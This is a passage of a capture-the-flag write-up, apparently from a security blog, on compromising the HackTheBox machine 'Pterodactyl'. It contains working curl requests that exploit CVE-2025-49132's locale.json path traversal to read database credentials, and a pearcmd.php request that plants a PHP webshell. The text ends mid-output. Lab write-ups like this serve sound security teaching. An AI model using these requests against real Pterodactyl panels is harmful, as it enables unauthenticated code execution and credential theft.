---
maquina: "Pterodactyl"
dificultad: "Medium"
os: "Linux"
plataforma: "htb"
release: "07 Feb 2026"
retire: "16 May 2026"
creadores: "HeadMonitor, TheCyberGeek"
htb_url: "https://hackthebox.com/machines/pterodactyl"
app_url: "https://app.hackthebox.com/machines/832"
url: "https://0xdf.gitlab.io/2026/05/16/htb-pterodactyl.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

Pterodactyl hosts a Minecraft community site alongside an instance of the Pterodactyl game-server management panel. I’ll exploit an unauthenticated directory traversal in the panel’s locale endpoint that gets PHP to include arbitrary files on disk, and chain it with the classic PEAR pearcmd technique to write and execute a webshell. From there I’ll read database credentials, crack a bcrypt hash, and pivot to a user who reuses that password. The box runs openSUSE, where I’ll abuse a PAM environment-variable flaw to convince Polkit I’m a local console session, then exploit a libblockdev/udisks vulnerability to mount a crafted XFS image carrying a SetUID-root shell and escalate to root. In Beyond Root, I’ll get CopyFail and DirtyFrag (two recent Linux kernel page-cache privilege-escalation exploits) working on the host.

## Recon

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```console
oxdf@hacky$ sudo nmap -p- -vvv --min-rate 10000 10.129.64.117
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-08 21:18 UTC
...[snip]...
Nmap scan report for 10.129.64.117
Host is up, received echo-reply ttl 63 (0.020s latency).
Scanned at 2026-05-08 21:18:49 UTC for 13s
Not shown: 65512 filtered tcp ports (no-response), 19 filtered tcp ports (admin-prohibited)
PORT     STATE  SERVICE    REASON
22/tcp   open   ssh        syn-ack ttl 63
80/tcp   open   http       syn-ack ttl 63
443/tcp  closed https      reset ttl 63
8080/tcp closed http-proxy reset ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.39 seconds
           Raw packets sent: 131060 (5.767MB) | Rcvd: 24 (1.564KB)
oxdf@hacky$ sudo nmap -p 22,80 -sCV 10.129.64.117
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-05-08 21:22 UTC
Nmap scan report for 10.129.64.117
Host is up (0.020s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6 (protocol 2.0)
| ssh-hostkey:
|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)
|_  256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)
80/tcp open  http    nginx 1.21.5
|_http-server-header: nginx/1.21.5
|_http-title: Did not follow redirect to http://pterodactyl.htb/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.93 seconds
```

The [application versions](https://0xdf.gitlab.io/cheatsheets/os#ubuntu) show a conflicting story. The OpenSSH version suggests the host is running Ubuntu 24.04 noble, but usually that has Ubuntu in the version string. Also, the Nginx version suggests something older, maybe 22.04 jammy if it’s Ubuntu. I’ve always found Nginx to be the least reliable for this enumeration, so it’s either just Ubuntu 24.04 with an older Nginx, or there could be Nginx in a container running older Ubuntu, or this could be some other flavor of Linux.

Both of the ports show a TTL of 63, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Linux one hop away. Nginx doesn’t typically show a decremented TTL regardless of if it is proxying to localhost or a container.

There are two ports that show as `closed`, standing out from the 65512 filtered ports. This implies a firewall rule or something else blocking these.

### Subdomain Brute Force - TCP 80

The `nmap` data shows a redirect to `pterodactyl.htb` on port 80. I’ll use `ffuf` to bruteforce for subdomains that respond differently from the default case:

```console
oxdf@hacky$ ffuf -u http://10.129.64.117 -H "Host: FUZZ.pterodactyl.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.64.117
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.pterodactyl.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 528ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1923 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

It finds one! I’ll add both to my `/etc/hosts` file:

```plaintext
10.129.64.117 pterodactyl.htb panel.pterodactyl.htb
```

I’ll rescan port 80 with `nmap` targeting each hostname, but not find anything interesting.

### pterodactyl.htb - TCP 80

#### Site

The site is for a Minecraft community:

![image-20260510133721500](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260510133721500.png)

The “Copy Server IP” button copies `play.pterodactyl.htb` to the clipboard. I’ll add that to my `hosts` file, but it just redirects to `pterodactyl.htb`.

The “Changelogs” link goes to `/changelog.txt`:

```plaintext
MonitorLand - CHANGELOG.txt
======================================

Version 1.20.X

[Added] Main Website Deployment
--------------------------------
- Deployed the primary landing site for MonitorLand.
- Implemented homepage, and link for Minecraft server.
- Integrated site styling and dark-mode as primary.

[Linked] Subdomain Configuration
--------------------------------
- Added DNS and reverse proxy routing for play.pterodactyl.htb.
- Configured NGINX virtual host for subdomain forwarding.

[Installed] Pterodactyl Panel v1.11.10
--------------------------------------
- Installed Pterodactyl Panel.
- Configured environment:
  - PHP with required extensions.
  - MariaDB 11.8.3 backend.

[Enhanced] PHP Capabilities
-------------------------------------
- Enabled PHP-FPM for smoother website handling on all domains.
- Enabled PHP-PEAR for PHP package management.
- Added temporary PHP debugging via phpinfo()
```

#### Tech Stack

The HTTP response headers show Nginx and PHP:

```http
HTTP/1.1 200 OK
Server: nginx/1.21.5
Date: Sun, 10 May 2026 17:37:03 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/8.4.8
Content-Length: 1686
```

The site version is 1.20.X (whatever that means).

The changelog gives a bunch of information about the site, including the fact that PHP-FPM (FastCGI Process Manager, commonly paired with Nginx) and PHP-PEAR (PHP Extension and Application Repository, a package manager for PHP libraries) are installed, as well as that the DB is MariaDB version 11.8.3.

The main site loads as `/index.php`. The 404 page is the [default nginx 404](https://0xdf.gitlab.io/cheatsheets/404#nginx):

![image-20260510134630897](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260510134630897.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```console
oxdf@hacky$ feroxbuster -u http://pterodactyl.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://pterodactyl.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l        9w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        3w       16c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       92l      186w     1696c http://pterodactyl.htb/global.css
200      GET       28l      105w      920c http://pterodactyl.htb/changelog.txt
200      GET       54l      123w     1686c http://pterodactyl.htb/index.php
301      GET        7l       11w      169c http://pterodactyl.htb/Public => http://pterodactyl.htb/Public/
200      GET     9854l    93838w  4648650c http://pterodactyl.htb/Public/Header.png
200      GET       54l      123w     1686c http://pterodactyl.htb/
200      GET      828l     4394w    73000c http://pterodactyl.htb/phpinfo.php
[####################] - 56s    60008/60008   0s      found:7       errors:2
[####################] - 54s    30000/30000   550/s   http://pterodactyl.htb/
[####################] - 54s    30000/30000   551/s   http://pterodactyl.htb/Public/
```

The only interesting thing is the `phpinfo.php` page (which was alluded to in the `changelog.txt`). This page leaks the full PHP configuration:

![image-20260510135028779](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260510135028779.png)

### panel.pterodactyl.htb - TCP 80

#### Site

This site is an instance of [Pterodactyl Panel](https://pterodactyl.io/):

![image-20260510134933446](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260510134933446.png)

#### Tech Stack

[Pterodactyl](https://pterodactyl.io/) describes itself as:

> a free, open-source game server management panel built with PHP, React, and Go. Designed with security in mind, Pterodactyl runs all game servers in isolated Docker containers while exposing a beautiful and intuitive UI to end users.

The HTTP response headers show Nginx and PHP:

```http
HTTP/1.1 200 OK
Server: nginx/1.21.5
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/8.4.8
Cache-Control: no-cache, private
Date: Sun, 10 May 2026 17:42:05 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6Inh0N1dQV3oxZzZocWR4N0dTaFQ0MHc9PSIsInZhbHVlIjoicEltVlZLc1pPYUlzdWtsREpHeExhTWVySEQ2MTVvbWVHSWdtZ3F2Zi8wRXhteTBqeW5rVm5aQ2ZSWU9BdkszdkxJU1ZLMEt0cHdSSUVaU0pSV2duZ1BRR1BPNDVYR0hiZldwS3RBa0hjNWxkRTUzbCtXd1BLeHVGaG43M1ZGcDYiLCJtYWMiOiJjNGQ4YmE1ODM3MTYxZGE2N2IxNzY5ZGFkNTU2MDFlZDBlOWJmMWYxYzM4OTNjY2Y3OTI1MzlhYjU2OTU5NGNiIiwidGFnIjoiIn0%3D; expires=Mon, 11 May 2026 05:42:05 GMT; Max-Age=43200; path=/; samesite=lax
Set-Cookie: pterodactyl_session=eyJpdiI6InJ2Zkl4Nk5oZkJOdkhRTG1BSTFXQUE9PSIsInZhbHVlIjoiblRJNnlwZzNEd1FPNEd5MkMvOStlMHgveFFPN2p1d2pOL3Z1RjcyeXIyM2JtWGxUVEt1cThldERESWpYN0d1U2RST1piWlh4OEFhb1FmWk44eWxoUXBua0hseHZCZnIxVEt0UjJBNElmc2pNSVorNVA2d2dxTHB3eHhYQkI5RDkiLCJtYWMiOiJjNDliNzIyMGQ5ZTcyYjQ3NzYyNmM2OTE1NmFhNzViZGMyMmU3NGY0ZTY4M2Y3MDg5ZTIzY2VhOWE0MzQzM2YyIiwidGFnIjoiIn0%3D; expires=Mon, 11 May 2026 05:42:05 GMT; Max-Age=43200; path=/; httponly; samesite=lax
Content-Length: 1897
```

Two cookies are also set. Whenever I see a `XSRF-TOKEN` and `<something>_session`, I think Laravel. Looking at the [source for Pterodactyl Panel](https://github.com/pterodactyl/panel) I’ll see that confirmed:

![image-20260510135359472](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260510135359472.png)

The 404 page just redirects to `/`. I’ll skip the brute force as it’s open source software.

The `changelog.txt` file did say this was `Panel v1.11.10`. Claude also identified this version using the JavaScript bundle:

![image-20260514105223077](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260514105223077.png)

## Shell as wwwrun

### CVE-2025-49132

#### Identify

Searching for vulnerabilities in this version of Pterodactyl Panel shows a lot of references to CVE-2025-49132:

![image-20260510155927758](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260510155927758.png)

#### Background

[CVE-2025-49132](https://nvd.nist.gov/vuln/detail/cve-2025-49132) is described by NVD as:

> Pterodactyl is a free, open-source game server management panel. Prior to version 1.11.11, using the /locales/locale.json with the locale and namespace query parameters, a malicious actor is able to execute arbitrary code without being authenticated. With the ability to execute arbitrary code it could be used to gain access to the Panel’s server, read credentials from the Panel’s config, extract sensitive information from the database, access files of servers managed by the panel, etc. This issue has been patched in version 1.11.11. There are no software workarounds for this vulnerability, but use of an external Web Application Firewall (WAF) could help mitigate this attack.

If I check the release for version 1.11.11, it has one item:

![image-20260510160242323](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260510160242323.png)

The NVD page links to [this commit](https://github.com/pterodactyl/panel/commit/24c82b0e335fb5d7a844226b08abf9f176e592f0) for fixing it. The diff is interesting:

![image-20260510160353190](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260510160353190.png)

Instead of just getting unsanitized data from the `Request` object, it creates a `LocaleRequest` object, which is also defined in this commit:

```php
<?php

namespace Pterodactyl\Http\Requests\Base;

use Illuminate\Foundation\Http\FormRequest;

class LocaleRequest extends FormRequest
{
    public function rules(): array
    {
        return [
            'locale' => ['required', 'string', 'regex:/^[a-z][a-z]$/'],
            'namespace' => ['required', 'string', 'regex:/^[a-z]{1,191}$/'],
        ];
    }
}
```

Now it filters the `locale` to be exactly two lowercase characters, and the `namespace` to be between 1 and 191 lowercase characters.

#### Vulnerable Code

To see what the bug actually looks like in the running version, I’ll walk through the three pieces in the [v1.11.10 tag](https://github.com/pterodactyl/panel/tree/v1.11.10).

First, `routes/base.php` ([source](https://github.com/pterodactyl/panel/blob/v1.11.10/routes/base.php#L12-L14)) defines three routes:

```php
<?php

use Illuminate\Support\Facades\Route;
use Pterodactyl\Http\Controllers\Base;
use Pterodactyl\Http\Middleware\RequireTwoFactorAuthentication;

Route::get('/', [Base\IndexController::class, 'index'])->name('index')->fallback();
Route::get('/account', [Base\IndexController::class, 'index'])
    ->withoutMiddleware(RequireTwoFactorAuthentication::class)
    ->name('account');

Route::get('/locales/locale.json', Base\LocaleController::class)
    ->withoutMiddleware(['auth', RequireTwoFactorAuthentication::class])
    ->where('namespace', '.*');

Route::get('/{react}', [Base\IndexController::class, 'index'])
    ->where('react', '^(?!(\/)?(api|auth|admin|daemon)).+');
```

The interesting one here is `/locales/locale.json`, which has two important modifiers:

- `withoutMiddleware(['auth', RequireTwoFactorAuthentication::class])` exposes this endpoint pre-auth.
- `where('namespace', '.*')` explicitly tells Laravel that the `namespace` route parameter may contain any characters.

The controller in `app/Http/Controllers/Base/LocaleController.php` ([source](https://github.com/pterodactyl/panel/blob/v1.11.10/app/Http/Controllers/Base/LocaleController.php#L23-L36)) defines the route:

```php
public function __invoke(Request $request): JsonResponse
{
    $locales = explode(' ', $request->input('locale') ?? '');
    $namespaces = explode(' ', $request->input('namespace') ?? '');

    $response = [];
    foreach ($locales as $locale) {
        $response[$locale] = [];
        foreach ($namespaces as $namespace) {
            $response[$locale][$namespace] = $this->i18n(
                $this->loader->load($locale, str_replace('.', '/', $namespace))
            );
        }
    }
    ...
}
```

Both `locale` and `namespace` come straight off the query string with no validation, and are handed to `$this->loader->load()`.

`$this->loader` is Laravel’s `Illuminate\Translation\FileLoader`. `load()` passes through to `loadPath()` in [`FileLoader.php` lines 120–127](https://github.com/laravel/framework/blob/v9.52.20/src/Illuminate/Translation/FileLoader.php#L120-L127), where the two parameters from `load` are passed as `$locale` and `$group`:

```php
protected function loadPath($path, $locale, $group)
{
    if ($this->files->exists($full = "{$path}/{$locale}/{$group}.php")) {
        return $this->files->getRequire($full);
    }

    return [];
}
```

`getRequire()` does a literal `require` on the path, so any PHP file on disk that the path resolves to gets executed. Because `$locale` and `$group` (our `namespace`) are completely attacker-controlled, `..` traversal in `locale` plus a path in `namespace` lets us pick any `.php` file on the box and have PHP `require` it.

#### Directory Traversal

Given what I’ve seen above, I control `locale` and `namespace` in the resulting URL:

```plaintext
/<legit path>/<local>/<namespace>.php
```

This means I can include PHP files, but I can’t read files like `/etc/passwd` because `.php` would be appended to the end. I can’t use a PHP filter because there’s a bunch of stuff prepended to the front of my input.

I could try to calculate the number of `../` necessary to get back to the root, but I’ll just experiment. I see there’s an `index.php` in the `public` folder at the root of the source repo. I’ll find it:

```console
oxdf@hacky$ curl 'http://panel.pterodactyl.htb/locales/locale.json?locale=public&namespace=index'
{"public":{"index":[]}}
oxdf@hacky$ curl 'http://panel.pterodactyl.htb/locales/locale.json?locale=../public&namespace=index'
{"..\/public":{"index":[]}}
oxdf@hacky$ curl 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../public&namespace=index'
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Server Error</title>

        <style>
            /*! normalize.css v8.0.1 | MIT License | github.com/necolas/normalize.css */html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}a{background-color:transparent}code{font-family:monospace,monospace;font-size:1em}[hidden]{display:none}html{font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;line-height:1.5}*,:after,:before{box-sizing:border-box;border:0 solid #e2e8f0}a{color:inherit;text-decoration:inherit}code{font-family:Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}svg,video{display:block;vertical-align:middle}video{max-width:100%;height:auto}.bg-white{--bg-opacity:1;background-color:#fff;background-color:rgba(255,255,255,var(--bg-opacity))}.bg-gray-100{--bg-opacity:1;background-color:#f7fafc;background-color:rgba(247,250,252,var(--bg-opacity))}.border-gray-200{--border-opacity:1;border-color:#edf2f7;border-color:rgba(237,242,247,var(--border-opacity))}.border-gray-400{--border-opacity:1;border-color:#cbd5e0;border-color:rgba(203,213,224,var(--border-opacity))}.border-t{border-top-width:1px}.border-r{border-right-width:1px}.flex{display:flex}.grid{display:grid}.hidden{display:none}.items-center{align-items:center}.justify-center{justify-content:center}.font-semibold{font-weight:600}.h-5{height:1.25rem}.h-8{height:2rem}.h-16{height:4rem}.text-sm{font-size:.875rem}.text-lg{font-size:1.125rem}.leading-7{line-height:1.75rem}.mx-auto{margin-left:auto;margin-right:auto}.ml-1{margin-left:.25rem}.mt-2{margin-top:.5rem}.mr-2{margin-right:.5rem}.ml-2{margin-left:.5rem}.mt-4{margin-top:1rem}.ml-4{margin-left:1rem}.mt-8{margin-top:2rem}.ml-12{margin-left:3rem}.-mt-px{margin-top:-1px}.max-w-xl{max-width:36rem}.max-w-6xl{max-width:72rem}.min-h-screen{min-height:100vh}.overflow-hidden{overflow:hidden}.p-6{padding:1.5rem}.py-4{padding-top:1rem;padding-bottom:1rem}.px-4{padding-left:1rem;padding-right:1rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.pt-8{padding-top:2rem}.fixed{position:fixed}.relative{position:relative}.top-0{top:0}.right-0{right:0}.shadow{box-shadow:0 1px 3px 0 rgba(0,0,0,.1),0 1px 2px 0 rgba(0,0,0,.06)}.text-center{text-align:center}.text-gray-200{--text-opacity:1;color:#edf2f7;color:rgba(237,242,247,var(--text-opacity))}.text-gray-300{--text-opacity:1;color:#e2e8f0;color:rgba(226,232,240,var(--text-opacity))}.text-gray-400{--text-opacity:1;color:#cbd5e0;color:rgba(203,213,224,var(--text-opacity))}.text-gray-500{--text-opacity:1;color:#a0aec0;color:rgba(160,174,192,var(--text-opacity))}.text-gray-600{--text-opacity:1;color:#718096;color:rgba(113,128,150,var(--text-opacity))}.text-gray-700{--text-opacity:1;color:#4a5568;color:rgba(74,85,104,var(--text-opacity))}.text-gray-900{--text-opacity:1;color:#1a202c;color:rgba(26,32,44,var(--text-opacity))}.uppercase{text-transform:uppercase}.underline{text-decoration:underline}.antialiased{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.tracking-wider{letter-spacing:.05em}.w-5{width:1.25rem}.w-8{width:2rem}.w-auto{width:auto}.grid-cols-1{grid-template-columns:repeat(1,minmax(0,1fr))}@-webkit-keyframes spin{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}@keyframes spin{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}@-webkit-keyframes ping{0%{transform:scale(1);opacity:1}75%,to{transform:scale(2);opacity:0}}@keyframes ping{0%{transform:scale(1);opacity:1}75%,to{transform:scale(2);opacity:0}}@-webkit-keyframes pulse{0%,to{opacity:1}50%{opacity:.5}}@keyframes pulse{0%,to{opacity:1}50%{opacity:.5}}@-webkit-keyframes bounce{0%,to{transform:translateY(-25%);-webkit-animation-timing-function:cubic-bezier(.8,0,1,1);animation-timing-function:cubic-bezier(.8,0,1,1)}50%{transform:translateY(0);-webkit-animation-timing-function:cubic-bezier(0,0,.2,1);animation-timing-function:cubic-bezier(0,0,.2,1)}}@keyframes bounce{0%,to{transform:translateY(-25%);-webkit-animation-timing-function:cubic-bezier(.8,0,1,1);animation-timing-function:cubic-bezier(.8,0,1,1)}50%{transform:translateY(0);-webkit-animation-timing-function:cubic-bezier(0,0,.2,1);animation-timing-function:cubic-bezier(0,0,.2,1)}}@media (min-width:640px){.sm\:rounded-lg{border-radius:.5rem}.sm\:block{display:block}.sm\:items-center{align-items:center}.sm\:justify-start{justify-content:flex-start}.sm\:justify-between{justify-content:space-between}.sm\:h-20{height:5rem}.sm\:ml-0{margin-left:0}.sm\:px-6{padding-left:1.5rem;padding-right:1.5rem}.sm\:pt-0{padding-top:0}.sm\:text-left{text-align:left}.sm\:text-right{text-align:right}}@media (min-width:768px){.md\:border-t-0{border-top-width:0}.md\:border-l{border-left-width:1px}.md\:grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}}@media (min-width:1024px){.lg\:px-8{padding-left:2rem;padding-right:2rem}}@media (prefers-color-scheme:dark){.dark\:bg-gray-800{--bg-opacity:1;background-color:#2d3748;background-color:rgba(45,55,72,var(--bg-opacity))}.dark\:bg-gray-900{--bg-opacity:1;background-color:#1a202c;background-color:rgba(26,32,44,var(--bg-opacity))}.dark\:border-gray-700{--border-opacity:1;border-color:#4a5568;border-color:rgba(74,85,104,var(--border-opacity))}.dark\:text-white{--text-opacity:1;color:#fff;color:rgba(255,255,255,var(--text-opacity))}.dark\:text-gray-400{--text-opacity:1;color:#cbd5e0;color:rgba(203,213,224,var(--text-opacity))}}
        </style>

        <style>
            body {
                font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            }
        </style>
    </head>
    <body class="antialiased">
        <div class="relative flex items-top justify-center min-h-screen bg-gray-100 dark:bg-gray-900 sm:items-center sm:pt-0">
            <div class="max-w-xl mx-auto sm:px-6 lg:px-8">
                <div class="flex items-center pt-8 sm:justify-start sm:pt-0">
                    <div class="px-4 text-lg text-gray-500 border-r border-gray-400 tracking-wider">
                        500                    </div>

                    <div class="ml-4 text-lg text-gray-500 uppercase tracking-wider">
                        Server Error                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
```

The empty `[]` responses from the first two attempts are the loader’s miss path. `loadPath()` only calls `getRequire()` if the file exists, otherwise it returns `[]`. The 500 page is the win. PHP successfully `require`d `public/index.php` (Laravel’s front controller) and crashed bootstrapping a second application from inside the running one. Two `../` is the right depth, and from here I can include any `.php` file under the project root.

#### Database

One useful thing to try is to leak DB creds. The connection is configured in `config/database.php`:

![image-20260510203722661](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260510203722661.png)

I’ll grab that using the traversal:

```console
oxdf@hacky$ curl 'http://panel.pterodactyl.htb/locales/locale.json?locale=../../config&namespace=database' -s | jq .
{
  "../../config": {
    "database": {
      "default": "mysql",
      "connections": {
        "mysql": {
          "driver": "mysql",
          "url": "",
          "host": "127.0.0.1",
          "port": "3306",
          "database": "panel",
          "username": "pterodactyl",
          "password": "PteraPanel",
          "unix_socket": "",
          "charset": "utf8mb4",
          "collation": "utf8mb4_unicode_ci",
          "prefix": "",
          "prefix_indexes": "1",
          "strict": "",
          "timezone": "+00{{00}}",
          "sslmode": "prefer",
          "options": {
            "1014": "1"
          }
        }
      },
      "migrations": "migrations",
      "redis": {
        "client": "predis",
        "options": {
          "cluster": "redis",
          "prefix": "pterodactyl_database_"
        },
        "default": {
          "scheme": "tcp",
          "path": "/run/redis/redis.sock",
          "host": "127.0.0.1",
          "username": "",
          "password": "",
          "port": "6379",
          "database": "0",
          "context": []
        },
        "sessions": {
          "scheme": "tcp",
          "path": "/run/redis/redis.sock",
          "host": "127.0.0.1",
          "username": "",
          "password": "",
          "port": "6379",
          "database": "1",
          "context": []
        }
      }
    }
  }
}
```

There is a username and password, but it doesn’t work over SSH and I can’t access the database from here.

### RCE via pearcmd.php

#### Background

The changelog shows that the PHP-PEAR package manager is installed. PEAR has largely been superseded by Composer in modern PHP, but it still shows up, especially in Docker. PEAR ships its CLI entry-point as a plain PHP file at `/usr/local/lib/php/pearcmd.php`. This is a really nice target for my LFI because it ends in `.php`. Hacktricks documents a [generic pearcmd.php LFI-to-RCE technique](https://hacktricks.wiki/en/pentesting-web/file-inclusion/index.html#via-pearcmdphp--url-args) as:

```http
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```

This is an odd URL structure, which is taking advantage of PHP’s `register_argc_argv` [setting](https://www.php.net/manual/en/ini.core.php#ini.register-argc-argv), which is enabled on Pterodactyl:

![image-20260511070134573](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260511070134573.png)

It’s not well documented, but looking at the PHP source code in `php_variables.c` on [lines 655-711](https://github.com/php/php-src/blob/769441ba430995733d2ad21727d51b1ace115317/main/php_variables.c#L655-L711) is a function named `php_build_argv`. In that function is this bit that shows splitting on `+`:

```c
	} else 	if (s && *s) {
		while (1) {
			const char *space = strchr(s, '+');
			/* auto-type */
			ZVAL_STRINGL(&tmp, s, space ? space - s : strlen(s));
			count++;
			if (zend_hash_next_index_insert(Z_ARRVAL(arr), &tmp) == NULL) {
				zend_string_efree(Z_STR(tmp));
			}
			if (!space) {
				break;
			}
			s = space + 1;
		}
	}
```

So the `argv` from the example is:

| i | argv[i] |
|---|---|
| 0 | [empty string, before first `+`] |
| 1 | `config-create` |
| 2 | `/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>` |
| 3 | `/tmp/hello.php` |

The `pearcmd.php` file takes a first arg as a command, and that command takes two arguments. The first (`argv[2]` above) is the content to write to the config file. In this case, that includes the arg with the file path, but since the locale.json response is plain JSON rather than executed PHP, those short-echo tags just show up as static text on the page until the dropped config file is later included via the LFI. The second (`argv[3]`) is the file path to write.

The strategy is to write a webshell that I can then include in a second request to the LFI.

#### POC for Pterodactyl

To adjust the POC for Pterodactyl, I’ll need to get the path for `pearcmd.php`. PHPInfo shows it:

![image-20260511095900364](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260511095900364.png)

I’ll update the `locale` variable to point to this:

- `locale=../../../../../usr/share/php/PEAR`
- `namespace=pearcmd`

Two `../` got me back to the project root for `public/index.php` and `config/database.php`; five walks me past the root of the project, all the way up to `/`, and then back down into `/usr/share/php/PEAR` for `pearcmd.php`.

I’ll also update the payload to a webshell. Spaces will mess up the URL and the args aren’t URL decoded before being written. I’ll use PHP short-echo tags to write a shell that doesn’t require spaces:

```php
<?=system($_REQUEST[0]);?>
```

The result is:

```console
oxdf@hacky$ curl -g 'http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_REQUEST[0]);?>+/tmp/shell.php'
CONFIGURATION (CHANNEL PEAR.PHP.NET):
=====================================
Auto-discover new Channels     auto_discover    <not set>
Default Channel                default_channel  pear.php.net
HTTP Proxy Server Address      http_proxy       <not set>
PEAR server [DEPRECATED]       master_server    <not set>
Default Channel Mirror         preferred_mirror <not set>
Remote Configuration File      remote_config    <not set>
PEAR executables directory     bin_dir          /&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_REQUEST[0]);?>/pear
PEAR documentation directory   doc_dir          /&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_REQUEST[0]);?>/pear/docs
PHP extension directory        ext_dir          /&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_REQUEST[0]);?>/pear/ext
PEAR directory                 php_dir          /&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_REQUEST[0]);?>/pear/php
PEAR Installer cache directory cache_dir        /&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_REQUEST[0]);?>/pear/cache
PEAR configuration file        cfg_dir          /&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_REQUEST[0]);?>/pear/cfg
directory
PEAR data directory            data_dir         /&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_REQUEST[0]);?>/pear/data
PEAR Installer download        download_dir     /&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_REQUEST[0]);?>/pear/download
directory
Systems manpage files          man_dir          /&locale=../../../../../usr/share/php/PEAR&namespace=pearcmd&/<?=system($_REQUEST[0]);?>/pear/man
directory
PEAR metadata directory        metadata_dir     <not set>
PHP CLI/CGI binary             php_bin          <not set>
php.ini location               php_ini          <not set>
--program-prefix passed to     php_prefix       <not set>
PHP's ./configure
--program-suffix passed to     php_suffix       <not set>
PHP's ./configure
